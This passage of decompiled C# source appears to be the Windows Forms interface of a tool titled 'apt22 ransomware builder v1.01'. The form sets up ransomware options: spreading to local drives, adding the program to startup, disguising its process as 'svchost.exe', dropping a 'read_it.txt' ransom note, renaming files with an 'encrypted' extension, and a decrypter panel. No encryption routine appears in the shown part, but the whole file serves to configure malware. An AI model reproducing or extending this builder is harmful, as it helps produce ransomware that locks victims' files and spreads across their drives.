				pictureBox1.Image = (Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).FileName, new Size(60, 60)).Handle);
				((Control)selectIconLabel).Text = "";
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void selectIconLabel_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).Filter = "Icons (*.ico)|*.ico";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).FileName;
				pictureBox1.Image = (Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).FileName, new Size(60, 60)).Handle);
				((Control)selectIconLabel).Text = "";
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)SleepTextBox).Enabled)
		{
			((Control)SleepTextBox).Enabled = true;
		}
		else
		{
			((Control)SleepTextBox).Enabled = false;
		}
	}

	private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
	{
		if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
		{
			e.Handled = true;
		}
	}

	private void shapedButton1_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new advancedSettingForm()).ShowDialog();
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void textBox1_MouseClick(object sender, MouseEventArgs e)
	{
	}

	private void TopPanel_Paint(object sender, PaintEventArgs e)
	{
	}

	private void shapedButton2_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		((Form)new extensions()).ShowDialog();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_021a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0224: Expected O, but got Unknown
		//IL_0231: Unknown result type (might be due to invalid IL or missing references)
		//IL_023b: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_031f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0329: Expected O, but got Unknown
		//IL_0336: Unknown result type (might be due to invalid IL or missing references)
		//IL_0340: Expected O, but got Unknown
		//IL_034d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0357: Expected O, but got Unknown
		//IL_0364: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Expected O, but got Unknown
		//IL_03c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ca: Expected O, but got Unknown
		//IL_05d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e0: Expected O, but got Unknown
		//IL_0653: Unknown result type (might be due to invalid IL or missing references)
		//IL_065d: Expected O, but got Unknown
		//IL_066a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0674: Expected O, but got Unknown
		//IL_0681: Unknown result type (might be due to invalid IL or missing references)
		//IL_068b: Expected O, but got Unknown
		//IL_06dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Expected O, but got Unknown
		//IL_083a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0844: Expected O, but got Unknown
		//IL_0851: Unknown result type (might be due to invalid IL or missing references)
		//IL_085b: Expected O, but got Unknown
		//IL_0868: Unknown result type (might be due to invalid IL or missing references)
		//IL_0872: Expected O, but got Unknown
		//IL_0a73: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a7d: Expected O, but got Unknown
		//IL_0add: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ae7: Expected O, but got Unknown
		//IL_0b08: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be3: Expected O, but got Unknown
		//IL_0c04: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cdf: Expected O, but got Unknown
		//IL_0d00: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ddb: Expected O, but got Unknown
		//IL_0df9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e96: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea0: Expected O, but got Unknown
		//IL_0f2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f38: Expected O, but got Unknown
		//IL_1095: Unknown result type (might be due to invalid IL or missing references)
		//IL_109f: Expected O, but got Unknown
		//IL_1120: Unknown result type (might be due to invalid IL or missing references)
		//IL_112a: Expected O, but got Unknown
		//IL_133d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1347: Expected O, but got Unknown
		//IL_1412: Unknown result type (might be due to invalid IL or missing references)
		//IL_141c: Expected O, but got Unknown
		//IL_14c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_14ca: Expected O, but got Unknown
		//IL_1625: Unknown result type (might be due to invalid IL or missing references)
		//IL_162f: Expected O, but got Unknown
		//IL_16ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_16f4: Expected O, but got Unknown
		//IL_17f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_17fd: Expected O, but got Unknown
		//IL_180a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1814: Expected O, but got Unknown
		//IL_1821: Unknown result type (might be due to invalid IL or missing references)
		//IL_182b: Expected O, but got Unknown
		//IL_18aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_18b4: Expected O, but got Unknown
		//IL_18c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_18cb: Expected O, but got Unknown
		//IL_18d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_18e2: Expected O, but got Unknown
		//IL_1962: Unknown result type (might be due to invalid IL or missing references)
		//IL_196c: Expected O, but got Unknown
		//IL_1979: Unknown result type (might be due to invalid IL or missing references)
		//IL_1983: Expected O, but got Unknown
		//IL_1990: Unknown result type (might be due to invalid IL or missing references)
		//IL_199a: Expected O, but got Unknown
		//IL_1a1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a24: Expected O, but got Unknown
		//IL_1a31: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a3b: Expected O, but got Unknown
		//IL_1a48: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a52: Expected O, but got Unknown
		//IL_1a94: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a9e: Expected O, but got Unknown
		//IL_1b34: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b3e: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(BlackForm));
		RightPanel = new Panel();
		TopPanel = new Panel();
		_MinButton = new ButtonZ();
		_MaxButton = new MinMaxButton();
		WindowTextLabel = new Label();
		_CloseButton = new ButtonZ();
		RightBottomPanel_1 = new Panel();
		panel2 = new Panel();
		button4 = new Button();
		button3 = new Button();
		button2 = new Button();
		button1 = new Button();
		label1 = new Label();
		droppedMessageTextbox = new TextBox();
		sleepCheckBox = new CheckBox();
		SleepTextBox = new TextBox();
		selectIconLabel = new Label();
		pictureBox1 = new PictureBox();
		startupcheckBox3 = new CheckBox();
		textBox4 = new TextBox();
		checkBox2 = new CheckBox();
		spreadNameText = new TextBox();
		checkBox1 = new CheckBox();
		textBox2 = new TextBox();
		usbSpreadCheckBox = new CheckBox();
		RightBottomPanel_2 = new Panel();
		LeftBottomPanel_2 = new Panel();
		RightTopPanel_1 = new Panel();
		RightTopPanel_2 = new Panel();
		textBox1 = new TextBox();
		saveFileDialog1 = new SaveFileDialog();
		openFileDialog1 = new OpenFileDialog();
		((Control)TopPanel).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)RightPanel).Anchor = (AnchorStyles)11;
		((Control)RightPanel).BackColor = Color.Black;
		((Control)RightPanel).Cursor = Cursors.SizeWE;
		((Control)RightPanel).Location = new Point(896, 22);
		((Control)RightPanel).Name = "RightPanel";
		((Control)RightPanel).Size = new Size(2, 468);
		((Control)RightPanel).TabIndex = 1;
		((Control)RightPanel).MouseDown += new MouseEventHandler(RightPanel_MouseDown);
		((Control)RightPanel).MouseMove += new MouseEventHandler(RightPanel_MouseMove);
		((Control)RightPanel).MouseUp += new MouseEventHandler(RightPanel_MouseUp);
		((Control)TopPanel).Anchor = (AnchorStyles)13;
		((Control)TopPanel).BackColor = Color.FromArgb(30, 30, 30);
		((Control)TopPanel).Controls.Add((Control)(object)_MinButton);
		((Control)TopPanel).Controls.Add((Control)(object)_MaxButton);
		((Control)TopPanel).Controls.Add((Control)(object)WindowTextLabel);
		((Control)TopPanel).Controls.Add((Control)(object)_CloseButton);
		((Control)TopPanel).Location = new Point(0, 0);
		((Control)TopPanel).Name = "TopPanel";
		((Control)TopPanel).Size = new Size(845, 74);
		((Control)TopPanel).TabIndex = 4;
		((Control)TopPanel).Paint += new PaintEventHandler(TopPanel_Paint);
		((Control)TopPanel).MouseDown += new MouseEventHandler(TopPanel_MouseDown);
		((Control)TopPanel).MouseMove += new MouseEventHandler(TopPanel_MouseMove);
		((Control)TopPanel).MouseUp += new MouseEventHandler(TopPanel_MouseUp);
		((Control)_MinButton).Anchor = (AnchorStyles)9;
		_MinButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MinButton.DisplayText = "_";
		((ButtonBase)_MinButton).FlatStyle = (FlatStyle)0;
		((Control)_MinButton).Font = new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)_MinButton).ForeColor = Color.White;
		((Control)_MinButton).Location = new Point(737, 8);
		_MinButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MinButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MinButton).Name = "_MinButton";
		((Control)_MinButton).Size = new Size(31, 24);
		((Control)_MinButton).TabIndex = 4;
		((Control)_MinButton).Text = "_";
		_MinButton.TextLocation_X = 6;
		_MinButton.TextLocation_Y = -20;
		((ButtonBase)_MinButton).UseVisualStyleBackColor = true;
		((Control)_MinButton).Click += _MinButton_Click;
		((Control)_MaxButton).Anchor = (AnchorStyles)9;
		_MaxButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
		_MaxButton.DisplayText = "_";
		((ButtonBase)_MaxButton).FlatStyle = (FlatStyle)0;
		((Control)_MaxButton).ForeColor = Color.White;
		((Control)_MaxButton).Location = new Point(774, 9);
		_MaxButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MaxButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MaxButton).Name = "_MaxButton";
		((Control)_MaxButton).Size = new Size(31, 24);
		((Control)_MaxButton).TabIndex = 2;
		((Control)_MaxButton).Text = "minMaxButton1";
		_MaxButton.TextLocation_X = 8;
		_MaxButton.TextLocation_Y = 6;
		((ButtonBase)_MaxButton).UseVisualStyleBackColor = true;
		((Control)_MaxButton).Click += _MaxButton_Click;
		((Control)WindowTextLabel).AutoSize = true;
		((Control)WindowTextLabel).Font = new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)WindowTextLabel).ForeColor = Color.White;
		((Control)WindowTextLabel).Location = new Point(8, 22);
		((Control)WindowTextLabel).Name = "WindowTextLabel";
		((Control)WindowTextLabel).Size = new Size(511, 39);
		((Control)WindowTextLabel).TabIndex = 1;
		((Control)WindowTextLabel).Text = "apt22 ransomware builder v1.01";
		((Control)WindowTextLabel).MouseDown += new MouseEventHandler(WindowTextLabel_MouseDown);
		((Control)WindowTextLabel).MouseMove += new MouseEventHandler(WindowTextLabel_MouseMove);
		((Control)WindowTextLabel).MouseUp += new MouseEventHandler(WindowTextLabel_MouseUp);
		((Control)_CloseButton).Anchor = (AnchorStyles)9;
		_CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_CloseButton.DisplayText = "X";
		((ButtonBase)_CloseButton).FlatStyle = (FlatStyle)0;
		((Control)_CloseButton).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)_CloseButton).ForeColor = Color.White;
		((Control)_CloseButton).Location = new Point(811, 8);
		_CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_CloseButton).Name = "_CloseButton";
		((Control)_CloseButton).Size = new Size(31, 24);
		((Control)_CloseButton).TabIndex = 0;
		((Control)_CloseButton).Text = "X";
		_CloseButton.TextLocation_X = 6;
		_CloseButton.TextLocation_Y = 1;
		((ButtonBase)_CloseButton).UseVisualStyleBackColor = true;
		((Control)_CloseButton).Click += _CloseButton_Click;
		((Control)RightBottomPanel_1).Anchor = (AnchorStyles)10;
		((Control)RightBottomPanel_1).BackColor = Color.Black;
		((Control)RightBottomPanel_1).Cursor = Cursors.SizeNWSE;
		((Control)RightBottomPanel_1).Location = new Point(878, 509);
		((Control)RightBottomPanel_1).Name = "RightBottomPanel_1";
		((Control)RightBottomPanel_1).Size = new Size(19, 2);
		((Control)RightBottomPanel_1).TabIndex = 5;
		((Control)RightBottomPanel_1).MouseDown += new MouseEventHandler(RightBottomPanel_1_MouseDown);
		((Control)RightBottomPanel_1).MouseMove += new MouseEventHandler(RightBottomPanel_1_MouseMove);
		((Control)RightBottomPanel_1).MouseUp += new MouseEventHandler(RightBottomPanel_1_MouseUp);
		((Control)panel2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)panel2).Controls.Add((Control)(object)button4);
		((Control)panel2).Controls.Add((Control)(object)button3);
		((Control)panel2).Controls.Add((Control)(object)button2);
		((Control)panel2).Controls.Add((Control)(object)button1);
		((Control)panel2).Controls.Add((Control)(object)label1);
		((Control)panel2).Controls.Add((Control)(object)droppedMessageTextbox);
		((Control)panel2).Controls.Add((Control)(object)sleepCheckBox);
		((Control)panel2).Controls.Add((Control)(object)SleepTextBox);
		((Control)panel2).Controls.Add((Control)(object)selectIconLabel);
		((Control)panel2).Controls.Add((Control)(object)pictureBox1);
		((Control)panel2).Controls.Add((Control)(object)startupcheckBox3);
		((Control)panel2).Controls.Add((Control)(object)textBox4);
		((Control)panel2).Controls.Add((Control)(object)checkBox2);
		((Control)panel2).Controls.Add((Control)(object)spreadNameText);
		((Control)panel2).Controls.Add((Control)(object)checkBox1);
		((Control)panel2).Controls.Add((Control)(object)textBox2);
		((Control)panel2).Controls.Add((Control)(object)usbSpreadCheckBox);
		((Control)panel2).Dock = (DockStyle)2;
		((Control)panel2).ForeColor = SystemColors.Control;
		((Control)panel2).Location = new Point(0, 398);
		((Control)panel2).Name = "panel2";
		((Control)panel2).Size = new Size(847, 146);
		((Control)panel2).TabIndex = 8;
		((Control)panel2).Paint += new PaintEventHandler(panel2_Paint);
		((ButtonBase)button4).FlatAppearance.BorderColor = Color.Chartreuse;
		((ButtonBase)button4).FlatAppearance.BorderSize = 2;
		((ButtonBase)button4).FlatAppearance.MouseOverBackColor = Color.FromArgb(64, 64, 64);
		((ButtonBase)button4).FlatStyle = (FlatStyle)0;
		((Control)button4).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button4).Location = new Point(693, 86);
		((Control)button4).Margin = new Padding(2, 2, 2, 2);
		((Control)button4).Name = "button4";
		((Control)button4).Size = new Size(141, 47);
		((Control)button4).TabIndex = 31;
		((Control)button4).Text = "Builder";
		((ButtonBase)button4).UseVisualStyleBackColor = true;
		((Control)button4).Click += button4_Click;
		((ButtonBase)button3).FlatAppearance.BorderColor = Color.Yellow;
		((ButtonBase)button3).FlatAppearance.BorderSize = 2;
		((ButtonBase)button3).FlatAppearance.MouseOverBackColor = Color.FromArgb(64, 64, 64);
		((ButtonBase)button3).FlatStyle = (FlatStyle)0;
		((Control)button3).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button3).Location = new Point(693, 22);
		((Control)button3).Margin = new Padding(2, 2, 2, 2);
		((Control)button3).Name = "button3";
		((Control)button3).Size = new Size(141, 47);
		((Control)button3).TabIndex = 30;
		((Control)button3).Text = "About";
		((ButtonBase)button3).UseVisualStyleBackColor = true;
		((Control)button3).Click += button3_Click;
		((ButtonBase)button2).FlatAppearance.BorderColor = Color.Red;
		((ButtonBase)button2).FlatAppearance.BorderSize = 2;
		((ButtonBase)button2).FlatAppearance.MouseOverBackColor = Color.FromArgb(64, 64, 64);
		((ButtonBase)button2).FlatStyle = (FlatStyle)0;
		((Control)button2).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button2).Location = new Point(173, 86);
		((Control)button2).Margin = new Padding(2, 2, 2, 2);
		((Control)button2).Name = "button2";
		((Control)button2).Size = new Size(168, 47);
		((Control)button2).TabIndex = 29;
		((Control)button2).Text = "Decrypter && Options";
		((ButtonBase)button2).UseVisualStyleBackColor = true;
		((Control)button2).Click += button2_Click;
		((ButtonBase)button1).FlatAppearance.BorderColor = Color.Blue;
		((ButtonBase)button1).FlatAppearance.BorderSize = 2;
		((ButtonBase)button1).FlatAppearance.MouseOverBackColor = Color.FromArgb(64, 64, 64);
		((ButtonBase)button1).FlatStyle = (FlatStyle)0;
		((Control)button1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)button1).Location = new Point(20, 86);
		((Control)button1).Margin = new Padding(2, 2, 2, 2);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(141, 47);
		((Control)button1).TabIndex = 28;
		((Control)button1).Text = "File Extensions";
		((ButtonBase)button1).UseVisualStyleBackColor = true;
		((Control)button1).Click += button1_Click_1;
		((Control)label1).Anchor = (AnchorStyles)9;
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label1).Location = new Point(522, 17);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(115, 15);
		((Control)label1).TabIndex = 26;
		((Control)label1).Text = "Dropped File Name";
		((Control)droppedMessageTextbox).Anchor = (AnchorStyles)9;
		((Control)droppedMessageTextbox).BackColor = Color.FromArgb(30, 30, 30);
		((Control)droppedMessageTextbox).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)droppedMessageTextbox).ForeColor = SystemColors.Window;
		((Control)droppedMessageTextbox).Location = new Point(525, 40);
		((Control)droppedMessageTextbox).Name = "droppedMessageTextbox";
		((Control)droppedMessageTextbox).Size = new Size(143, 22);
		((Control)droppedMessageTextbox).TabIndex = 25;
		((Control)droppedMessageTextbox).Text = "read_it.txt";
		droppedMessageTextbox.TextAlign = (HorizontalAlignment)2;
		((Control)sleepCheckBox).Anchor = (AnchorStyles)9;
		((Control)sleepCheckBox).AutoSize = true;
		((Control)sleepCheckBox).Cursor = Cursors.Hand;
		((Control)sleepCheckBox).Location = new Point(359, 81);
		((Control)sleepCheckBox).Name = "sleepCheckBox";
		((Control)sleepCheckBox).Size = new Size(91, 17);
		((Control)sleepCheckBox).TabIndex = 22;
		((Control)sleepCheckBox).Text = "Delay second";
		((ButtonBase)sleepCheckBox).UseVisualStyleBackColor = true;
		sleepCheckBox.CheckedChanged += checkBox3_CheckedChanged;
		((Control)SleepTextBox).Anchor = (AnchorStyles)9;
		((Control)SleepTextBox).BackColor = Color.FromArgb(30, 30, 30);
		((Control)SleepTextBox).Enabled = false;
		((Control)SleepTextBox).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)SleepTextBox).ForeColor = SystemColors.Window;
		((Control)SleepTextBox).Location = new Point(359, 107);
		((Control)SleepTextBox).Name = "SleepTextBox";
		((Control)SleepTextBox).Size = new Size(91, 22);
		((Control)SleepTextBox).TabIndex = 21;
		((Control)SleepTextBox).Text = "10";
		SleepTextBox.TextAlign = (HorizontalAlignment)2;
		((Control)SleepTextBox).KeyPress += new KeyPressEventHandler(SleepTextBox_KeyPress_1);
		((Control)selectIconLabel).Anchor = (AnchorStyles)9;
		((Control)selectIconLabel).AutoSize = true;
		((Control)selectIconLabel).Cursor = Cursors.Hand;
		((Control)selectIconLabel).Location = new Point(593, 93);
		((Control)selectIconLabel).Name = "selectIconLabel";
		((Control)selectIconLabel).Size = new Size(61, 13);
		((Control)selectIconLabel).TabIndex = 20;
		((Control)selectIconLabel).Text = "Select Icon";
		((Control)selectIconLabel).Click += selectIconLabel_Click;
		((Control)pictureBox1).Anchor = (AnchorStyles)9;
		pictureBox1.BorderStyle = (BorderStyle)1;
		((Control)pictureBox1).Cursor = Cursors.Hand;
		((Control)pictureBox1).Location = new Point(579, 68);
		((Control)pictureBox1).Name = "pictureBox1";
		((Control)pictureBox1).Size = new Size(89, 69);
		pictureBox1.SizeMode = (PictureBoxSizeMode)3;
		pictureBox1.TabIndex = 18;
		pictureBox1.TabStop = false;
		((Control)pictureBox1).Click += pictureBox1_Click;
		((Control)startupcheckBox3).Anchor = (AnchorStyles)9;
		((Control)startupcheckBox3).AutoSize = true;
		startupcheckBox3.Checked = true;
		startupcheckBox3.CheckState = (CheckState)1;
		((Control)startupcheckBox3).Cursor = Cursors.Hand;
		((Control)startupcheckBox3).Location = new Point(470, 82);
		((Control)startupcheckBox3).Name = "startupcheckBox3";
		((Control)startupcheckBox3).Size = new Size(92, 17);
		((Control)startupcheckBox3).TabIndex = 15;
		((Control)startupcheckBox3).Text = "Add to startup";
		((ButtonBase)startupcheckBox3).UseVisualStyleBackColor = true;
		((Control)textBox4).Anchor = (AnchorStyles)9;
		((Control)textBox4).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox4).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox4).ForeColor = SystemColors.Window;
		((Control)textBox4).Location = new Point(359, 40);
		((Control)textBox4).Name = "textBox4";
		((Control)textBox4).Size = new Size(143, 22);
		((Control)textBox4).TabIndex = 14;
		((Control)textBox4).Text = "svchost.exe";
		textBox4.TextAlign = (HorizontalAlignment)2;
		((Control)checkBox2).Anchor = (AnchorStyles)9;
		((Control)checkBox2).AutoSize = true;
		checkBox2.Checked = true;
		checkBox2.CheckState = (CheckState)1;
		((Control)checkBox2).Cursor = Cursors.Hand;
		((Control)checkBox2).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)checkBox2).Location = new Point(358, 17);
		((Control)checkBox2).Name = "checkBox2";
		((Control)checkBox2).Size = new Size(104, 17);
		((Control)checkBox2).TabIndex = 13;
		((Control)checkBox2).Text = "Proccess Name:";
		((ButtonBase)checkBox2).UseVisualStyleBackColor = true;
		checkBox2.CheckedChanged += checkBox2_CheckedChanged;
		((Control)spreadNameText).BackColor = Color.FromArgb(30, 30, 30);
		((Control)spreadNameText).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)spreadNameText).ForeColor = SystemColors.Window;
		((Control)spreadNameText).Location = new Point(190, 40);
		((Control)spreadNameText).Name = "spreadNameText";
		((Control)spreadNameText).Size = new Size(143, 22);
		((Control)spreadNameText).TabIndex = 12;
		((Control)spreadNameText).Text = "surprise";
		spreadNameText.TextAlign = (HorizontalAlignment)2;
		((Control)checkBox1).AutoSize = true;
		checkBox1.Checked = true;
		checkBox1.CheckState = (CheckState)1;
		((Control)checkBox1).Cursor = Cursors.Hand;
		((Control)checkBox1).Location = new Point(20, 14);
		((Control)checkBox1).Name = "checkBox1";
		((Control)checkBox1).Size = new Size(146, 17);
		((Control)checkBox1).TabIndex = 11;
		((Control)checkBox1).Text = "Randomize file extension:";
		((ButtonBase)checkBox1).UseVisualStyleBackColor = true;
		checkBox1.CheckedChanged += checkBox1_CheckedChanged;
		((Control)textBox2).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox2).Enabled = false;
		((Control)textBox2).Font = new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox2).ForeColor = SystemColors.Window;
		((Control)textBox2).Location = new Point(20, 40);
		((Control)textBox2).Name = "textBox2";
		((Control)textBox2).Size = new Size(143, 22);
		((Control)textBox2).TabIndex = 10;
		((Control)textBox2).Text = "encrypted";
		textBox2.TextAlign = (HorizontalAlignment)2;
		((Control)usbSpreadCheckBox).AutoSize = true;
		usbSpreadCheckBox.Checked = true;
		usbSpreadCheckBox.CheckState = (CheckState)1;
		((Control)usbSpreadCheckBox).Cursor = Cursors.Hand;
		((Control)usbSpreadCheckBox).Font = new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)usbSpreadCheckBox).Location = new Point(193, 14);
		((Control)usbSpreadCheckBox).Name = "usbSpreadCheckBox";
		((Control)usbSpreadCheckBox).Size = new Size(122, 17);
		((Control)usbSpreadCheckBox).TabIndex = 9;
		((Control)usbSpreadCheckBox).Text = "Spread Local Drives";
		((ButtonBase)usbSpreadCheckBox).UseVisualStyleBackColor = true;
		usbSpreadCheckBox.CheckedChanged += usbSpreadCheckBox_CheckedChanged;
		((Control)RightBottomPanel_2).Anchor = (AnchorStyles)10;
		((Control)RightBottomPanel_2).BackColor = Color.Black;
		((Control)RightBottomPanel_2).Cursor = Cursors.SizeNWSE;
		((Control)RightBottomPanel_2).Location = new Point(896, 490);
		((Control)RightBottomPanel_2).Name = "RightBottomPanel_2";
		((Control)RightBottomPanel_2).Size = new Size(2, 19);
		((Control)RightBottomPanel_2).TabIndex = 9;
		((Control)RightBottomPanel_2).MouseDown += new MouseEventHandler(RightBottomPanel_2_MouseDown);
		((Control)RightBottomPanel_2).MouseMove += new MouseEventHandler(RightBottomPanel_2_MouseMove);
		((Control)RightBottomPanel_2).MouseUp += new MouseEventHandler(RightBottomPanel_2_MouseUp);
		((Control)LeftBottomPanel_2).Anchor = (AnchorStyles)6;
		((Control)LeftBottomPanel_2).BackColor = Color.Black;
		((Control)LeftBottomPanel_2).Cursor = Cursors.SizeNESW;
		((Control)LeftBottomPanel_2).Location = new Point(0, 491);
		((Control)LeftBottomPanel_2).Name = "LeftBottomPanel_2";
		((Control)LeftBottomPanel_2).Size = new Size(2, 19);
